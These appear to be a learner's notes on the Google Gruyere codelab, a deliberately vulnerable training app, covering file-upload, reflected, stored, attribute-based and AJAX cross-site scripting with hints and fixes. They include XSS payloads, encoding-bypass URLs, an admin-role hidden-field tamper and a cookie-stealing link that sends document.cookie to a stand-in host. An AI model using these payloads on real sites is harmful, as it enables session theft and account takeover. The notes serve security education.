1. Login as a normal user

In new snipper option we can type:`<b><a href="window.location='http://somewhere.com?data='+ document.cookie">click me me me </a></b>`  for cookiw stealing.

2. Look at the code for bugs
    a. IN the signup page the form method uses get function
    b. THere is hidden field with `new` as value if we cahngfe that to `admin`

Following the web exploit and defenses - 

1. Cross site scripting (XSS)

2. File upload XSS 
Can you upload a file that allows you to execute arbitrary script on the google-gruyere.appspot.com domain?
Hint

You can upload HTML files and HTML files can contain script.
Exploit and Fix

To exploit, upload a .html file containing a script like this:

<script>
alert(document.cookie);
</script>

To fix, host the content on a separate domain so the script won't have access to any content from your domain. That is, instead of hosting user content on example.com/username we would host it at username.usercontent.example.com or username.example-usercontent.com. (Including something like "usercontent" in the domain name avoids attackers registering usernames that look innocent like wwww and using them for phishing attacks.) 

3. Reflected XSS

 The most dangerous characters in a URL are < and >. If you can get an application to directly insert what you want in a page and can get those characters through, then you can probably get a script through. Try these:

https://google-gruyere.appspot.com/650318352957853130133175248747589003590/%3e%3c
https://google-gruyere.appspot.com/650318352957853130133175248747589003590/%253e%253c
https://google-gruyere.appspot.com/650318352957853130133175248747589003590/%c0%be%c0%bc
https://google-gruyere.appspot.com/650318352957853130133175248747589003590/%26gt;%26lt;
https://google-gruyere.appspot.com/650318352957853130133175248747589003590/%26amp;gt;%26amp;lt;
https://google-gruyere.appspot.com/650318352957853130133175248747589003590/\074\x3c\u003c\x3C\u003C\X3C\U003C
https://google-gruyere.appspot.com/650318352957853130133175248747589003590/+ADw-+AD4-

This tries > and < in many different ways that might be able to make it through the URL and get rendered incorrectly using: verbatim (URL %-encoding), double %-encoding, bad UTF-8 encoding, HTML &-encoding, double &-encoding, and several different variations on C-style encoding. View the resulting source and see if any of those work. (Note: literally typing >< in the URL is identical to %3e%3c because the browser automatically %-encodes those character. If you are trying to want a literal > or < then you will need to use a tool like curl to send those characters in URL.) 

o exploit, create a URL like the following and get a victim to click on it:

https://google-gruyere.appspot.com/650318352957853130133175248747589003590/%26lt;b%26gt%26lt;script%26gt;alert(1)%26lt;%2Fscript%26gt;%26lt;%2Fb%26gt


4. Stored XSS

 Now find a stored XSS. What we want to do is put a script in a place where Gruyere will serve it back to another user.
The most obvious place that Gruyere serves back user-provided data is in a snippet (ignoring uploaded files which we've already discussed.)

Hint 1

Put this in a snippet and see what you get:

<script>alert(1)</script>

There are many different ways that script can be embedded in a document.

Hint 2

Hackers don't limit themselves to valid HTML syntax. Try some invalid HTML and see what you get. You may need to experiment a bit in order to find something that will work. There are multiple ways to do this.

Exploit and Fix

To exploit, enter any of these as your snippet (there are certainly more methods):

(1) <a onmouseover="alert(1)" href="#">read this!</a>

(2) <p <script>alert(1)</script>hello

(3) </td <script>alert(1)</script>hello

Notice that there are multiple failures in sanitizing the HTML. Snippet 1 worked because onmouseover was inadvertently omitted from the list of disallowed attributes in sanitize.py. Snippets 2 and 3 work because browsers tend to be forgiving with HTML syntax and the handling of both start and end tags is buggy.

To fix, we need to investigate and fix the sanitizing performed on the snippets. Snippets are sanitized in _SanitizeTag in the sanitize.py file. Let's block snippet 1 by adding "onmouseover" to the list of disallowed_attributes.

Oops! This doesn't completely solve the problem. Looking at the code that was just fixed, can you find a way to bypass the fix? 


Exploit and Fix

The fix was insufficient because the code that checks for disallowed attributes is case sensitive and HTML is not. So this still works:

(1') <a ONMOUSEOVER="alert(1)" href="#">read this!</a>

Correctly sanitizing HTML is a tricky problem. The _SanitizeTag function has a number of critical design flaws:

    It does not validate the well-formedness of the input HTML. As we see, badly formed HTML passes through the sanitizer unchanged. Since browsers typically apply very lenient parsing, it is very hard to predict the browser's interpretation of the given HTML unless we exercise strict control on its format.
    It uses blacklisting of attributes, which is a bad technique. One of our exploits got past the blacklist simply by using an uppercase version of the attribute. There could be other attributes missing from this list that are dangerous. It is always better to whitelist known good values.
    The sanitizer does not do any further sanitization of attribute values. This is dangerous since URI attributes like href and src and the style attribute can all be used to inject JavaScript.

The right approach to HTML sanitization is to:

    Parse the input into an intermediate DOM structure, then rebuild the body as well-formed output.
    Use strict whitelists for allowed tags and attributes.
    Apply strict sanitization of URL and CSS attributes if they are permitted.

Whenever possible it is preferable to use an already available known and proven HTML sanitizer. 

Index of HTML attributes : https://www.w3.org/TR/html40/index/attributes.html

5. Stored XSS via HTML attribute



You can also do XSS by injecting a value into an HTML attribute. Inject a script by setting the color value in a profile.

Hint 1

The color is rendered as style='color:color'. Try including a single quote character in your color name.

Hint 2

You can insert an HTML attribute that executes a script.

Exploit and Fixes

To exploit, use the following for your color preference:

red' onload='alert(1)' onmouseover='alert(2)

You may need to move the mouse over the snippet to trigger the attack. This attack works because the first quote ends the style attribute and the second quote starts the onload attribute.

But this attack shouldn't work at all. Take a look at home.gtl where it renders the color. It says style='{{color:text}}' and as we saw earlier, the :text part tells it to escape text. So why doesn't this get escaped? In gtl.py, it calls cgi.escape(str(value)) which takes an optional second parameter that indicates that the value is being used in an HTML attribute. So you can replace this with cgi.escape(str(value),True). Except that doesn't fix it! The problem is that cgi.escape assumes your HTML attributes are enclosed in double quotes and this file is using single quotes. (This should teach you to always carefully read the documentation for libraries you use and to always test that they do what you want.)

You'll note that this attack uses both onload and onmouseover. That's because even though W3C specifies that onload events is only supported on body and frameset elements, some browsers support them on other elements. So if the victim is using one of those browsers, the attack always succeeds. Otherwise, it succeeds when the user moves the mouse. It's not uncommon for attackers to use multiple attack vectors at the same time.

To fix, we need to use a correct text escaper, that escapes single and double quotes too. Add the following function to gtl.py and call it instead of cgi.escape for the text escaper.

def _EscapeTextToHtml(var):
  """Escape HTML metacharacters.

  This function escapes characters that are dangerous to insert into
  HTML. It prevents XSS via quotes or script injected in attribute values.

  It is safer than cgi.escape, which escapes only <, >, & by default.
  cgi.escape can be told to escape double quotes, but it will never
  escape single quotes.
  """
  meta_chars = {
      '"': '&quot;',
      '\'': '&#39;',  # Not &apos;
      '&': '&amp;',
      '<': '&lt;',
      '>': '&gt;',
      }
  escaped_var = ""
  for i in var:
    if i in meta_chars:
      escaped_var = escaped_var + meta_chars[i]
    else:
      escaped_var = escaped_var + i
  return escaped_var

Oops! This doesn't completely solve the problem. Even with the above fix in place, the color value is still vulnerable. 

6. stored XSS via AJAX

Find an XSS attack that uses a bug in Gruyere's AJAX code. The attack should be triggered when you click the refresh link on the page.

Hint 1

Run curl on https://google-gruyere.appspot.com/650318352957853130133175248747589003590/feed.gtl and look at the result. (Or browse to it in your browser and view source.) You'll see that it includes each user's first snippet into the response. This entire response is then evaluated on the client side which then inserts the snippets into the document. Can you put something in your snippet that will be parsed differently than expected?

Hint 2

Try putting some quotes (") in your snippet.

Exploit and Fixes

To exploit, Put this in your snippet:

all <span style=display:none>"
+ (alert(1),"")
+ "</span>your base

The JSON should look like

_feed(({..., "Mallory": "snippet", ...}))

but instead looks like this:

_feed({..., "Mallory": "all <span style=display:none>"
+ (alert(1),"")
+ "</span>your base", ...})

Each underlined part is a separate expression. Note that this exploit is written to be invisible both in the original page rendering (because of the <span style=display:none>) and after refresh (because it inserts only an empty string). All that will appear on the screen is all your base. There are bugs on both the server and client sides which enable this attack.

To fix, first, on the server side, the text is incorrectly escaped when it is rendered in the JSON response. The template says {{snippet.0:html}} but that's not enough. This text is going to be inserted into the innerHTML of a DOM node so the HTML does have to be sanitized. However, that sanitized text is then going to be inserted into JavaScript and single and double quotes have to be escaped. That is, adding support for {{...:js}} to GTL would not be sufficient; we would also need to support something like {{...:html:js}}.

To escape quotes, use \x27 and \x22 for single and double quote respectively. Replacing them with &#27; and &quot; is incorrect as those are not recognized in JavaScript strings and will break quotes around HTML attribute.

Second, in the browser, Gruyere converts the JSON by using JavaScript's eval. In general, eval is very dangerous and should rarely be used. If it used, it must be used very carefully, which is hardly the case here. We should be using the JSON parser which ensures that the string does not include any unsafe content. The JSON parser is available at json.org. 


7. Reflected XSS via AJAX

 Find a URL that when clicked on will execute a script using one of Gruyere's AJAX features.

Hint 1

When Gruyere refreshes a user snippets page, it uses

https://google-gruyere.appspot.com/650318352957853130133175248747589003590/feed.gtl?uid=value

and the result is the script

_feed((["user", "snippet1", ... ]))

Hint 2

This uses a different vulnerability, but the exploit is very similar to the previous reflected XSS exploit.

Exploit and Fixes

To exploit, create a URL like the following and get a victim to click on it:

https://google-gruyere.appspot.com/650318352957853130133175248747589003590/feed.gtl?uid=<script>alert(1)</script>
https://google-gruyere.appspot.com/650318352957853130133175248747589003590/feed.gtl?uid=%3Cscript%3Ealert(1)%3C/script%3E

This renders as

_feed((["<script>alert(1)</script>"]))

which surprisingly does execute the script. The bug is that Gruyere returns all gtl files as content type text/html and browsers are very tolerant of what HTML files they accept.

To fix, you need to make sure that your JSON content can never be interpreted as HTML. Even though literal < and > are allowed in JavaScript strings, you need to make sure they don't appear literally where a browser can misinterpret them. Thus, you'd need to modify {{...:js}} to replace them with the JavaScript escapes \x3c and \x3e. It is always safe to write '\x3c\x3e' in Javscript strings instead of '<>'. (And, as noted above, using the HTML escapes &lt; and &gt; is incorrect.)

You should also always set the content type of your responses, in this case serving JSON results as application/javascript. This alone doesn't solve the problem because browsers don't always respect the content type: browsers sometimes do "sniffing" to try to "fix" results from servers that don't provide the correct content type.

But wait, there's more! Gruyere doesn't set the content encoding either. And some browsers try to guess what the encoding type of a document is or an attacker may be able to embed content in a document that defines the content type. So, for example, if an attacker can trick the browser into thinking a document is UTF-7 then it could embed a script tag as +ADw-script+AD4- since +ADw- and +AD4- are alternate encodings for < and >. So always set both the content type and the content encoding of your responses, e.g., for HTML:

Content-Type: text/html; charset=utf-8


 